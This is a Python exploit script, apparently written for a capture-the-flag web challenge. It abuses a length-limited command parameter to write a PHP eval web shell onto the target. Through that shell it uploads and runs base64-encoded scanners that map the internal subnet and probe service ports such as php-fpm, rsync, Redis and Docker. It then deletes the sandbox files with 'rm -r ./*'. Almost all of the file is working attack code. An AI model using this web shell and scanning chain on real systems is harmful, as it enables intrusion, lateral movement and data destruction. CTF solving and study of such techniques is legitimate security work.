#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests as req
import re
import sys
import hashlib
import time
import base64

URL = 'https://473831530.trains.virzz.com/'
DEBUG = False


def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])


def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)


def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')


def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s


def md5_orange(s):
    return hashlib.md5('orange' + s).hexdigest()


def web_cmd(cmd):
    param = {
        "cmd": cmd
    }
    res = req.get(URL, params=param)
    if res.status_code == 200 and len(cmd) <= 20:
        if DEBUG:
            print("[*] \tThis url : %s" % res.url)
        return res.content
    else:
        print(len(cmd), cmd)
        return False


def web_get_result(u):
    res = req.get(URL + u)
    if res.status_code == 200:
        return res.content
    else:
        return False


def web_shell(path, pwd, code):
    data = {
        pwd: code
    }
    try:
        res = req.post(URL + path, data, timeout=5)
        if DEBUG:
            print(data)
        if res.status_code == 200:
            return res.content
        else:
            print(res.content)
            return False
    except req.exceptions.ReadTimeout as e:
        return 'Read timed out'
    except Exception as e:
        print(e)
        return False


def main():
    ip = ''
    ws = ''
    this_ip = ''
    res = req.get(URL)
    if res.status_code == 200:
        html = res.content
        m = re.findall(
            r'IP : ((\d*\.?)+)', html)
        ip = m[0][0]
        if not ip:
            print('[-] Error to get ip')
            return False
    else:
        print("[-] Error to req challenge")
        return False
    _url = "sandbox/%s/" % md5_orange(ip)
    # test
    print("[+] Test to exec cmd 'whoami' and get result")
    if web_cmd('whoami > v.txt'):
        r = web_get_result(_url + 'v.txt')
        print("[+] Exec succeed! result '%s'" % r[:-1])
    # getshell
    print("[+] Test to getshell by cmd")
    if web_cmd("echo '<?php @eval'>v") \
            and web_cmd("echo '($_POST'>>v") \
            and web_cmd("echo '[v]);?>' >>v") \
            and web_cmd("cp v v.php"):
        r = web_shell(_url + 'v.php', 'v', 'echo "virink";')
        if 'virink' in r:
            ws = _url + 'v.php'
            print("[+] Getshell succeed!")
            print("[!] %s pwd: v" % (URL + ws))
    # net scan
    # ws = '/sandbox/e02e5c9d01f0a60ed34e58dbd4d8dc9f/v.php'
    pl = 'echo $_SERVER["SERVER_ADDR"];'
    res = web_shell(ws, 'v', pl)
    if res and ('172' in res or '192' in res or '10.' in res):
        this_ip = res
    http_server_scan = """from socket import *
_ip = "ipipipip"
with open('s.txt', 'w') as f:
    for i in range(256):
        s = socket(AF_INET, SOCK_STREAM)
        s.settimeout(1)
        ip = "%s.%d" % (_ip, i)
        try:
            r = s.connect_ex((ip, 80))
            if r == 0:
                print(r)
                f.write(ip + '\\n')
                f.flush()
        except:
            pass
        s.close()
""".replace("ipipipip", this_ip[:this_ip.rfind(".")]).encode("base64")
    # print(http_server_scan)
    # upload http_server_scan script
    pl = 'file_put_contents("ps.py",base64_decode("%s"));echo file_get_contents("ps.py");' % http_server_scan
    res = web_shell(ws, 'v', pl)
    if res and DEBUG:
        print(res)
    # run http_server_scan
    print("[+] Scan Server...")
    pl = 'echo shell_exec("python3 ps.py &");'
    res = web_shell(ws, 'v', pl)
    # _url = "sandbox/e02e5c9d01f0a60ed34e58dbd4d8dc9f/"
    for i in range(255):
        n = int(i * 100 / 255) + 1
        sys.stdout.write('[+] {0} {1}%\r'.format("=" * (n / 2), n))
        sys.stdout.flush()
        time.sleep(1)
    print('[+] {0} {1}%'.format("=" * 50, n))
    r = web_get_result(_url + 's.txt')
    new_server = [i for i in r.split('\n') if i != this_ip and i[
        i.rfind(".") + 1:] != '1' and i][0]
    # print(new_server)
    # new_server = '172.16.233.111'
    server_port_scan = """from socket import *
ip = "ipipipip"
_p = [80, 8080, 3306, 9000, 1521, 873, 3389, 21, 22, 23, 443, 2375, 6379]
with open('p.txt', 'w') as f:
    for i in _p:
        s = socket(AF_INET, SOCK_STREAM)
        s.settimeout(1)
        try:
            r = s.connect_ex((ip, i))
            if r == 0:
                print(i)
                f.write('%d\\n' % i)
                f.flush()
        except:
            pass
        s.close()""".replace("ipipipip", new_server).encode("base64")
    # upload server_port_scan script
    pl = 'file_put_contents("pp.py",base64_decode("%s"));echo file_get_contents("pp.py");' % server_port_scan
    res = web_shell(ws, 'v', pl)
    if res and DEBUG:
        print(res)
    # run http_server_scan
    print("[+] Scan Port...")
    pl = 'echo shell_exec("python3 pp.py &");'
    res = web_shell(ws, 'v', pl)
    if res and DEBUG:
        print(res)
    for i in range(13):
        n = int(i / 13 * 100) + 1
        sys.stdout.write('-> {0} {1}%\r'.format("=" * (n / 2), n))
        sys.stdout.flush()
        time.sleep(1)
    print('[+] {0} {1}%'.format("=" * 50, n))
    r = web_get_result(_url + 'p.txt')
    if r:
        ps = r.split('\n')
        if '9000' in ps:
            print("[+] php-fpm 未授权访问")
        if '873' in ps:
            print("[+] rsync 未授权访问")
    print("[!] Clean up ...")
    web_cmd("rm -r ./*")
    print("[!] ==============================")
    print("[!] 剩下的还没写。。。。 ")
    print("[!] ==============================")


if __name__ == '__main__':
    main()
    # find php file and guess path
    # ws = '/sandbox/e02e5c9d01f0a60ed34e58dbd4d8dc9f/v.php'
    # pl = 'echo file_get_contents("http://172.16.233.111:/index.html");'
    # res = web_shell(ws, 'v', pl)
    # fpmpath = ''
    # if res:
    #     m = re.findall(r"url='/(.*?)'", res)
    #     if m and 'php' in m[0]:
    #         fpmpath = '/www/%s' % m[0]
    #         print("[+] Get the fpm-file-path")
    # if not fpmpath:
    #     print("[-] Error to get fpm-file-path")
    #     return False
    # find flag
    # pl = '<?php system("ls");exit;'
    # res = web_shell(ws, 'v', pl)
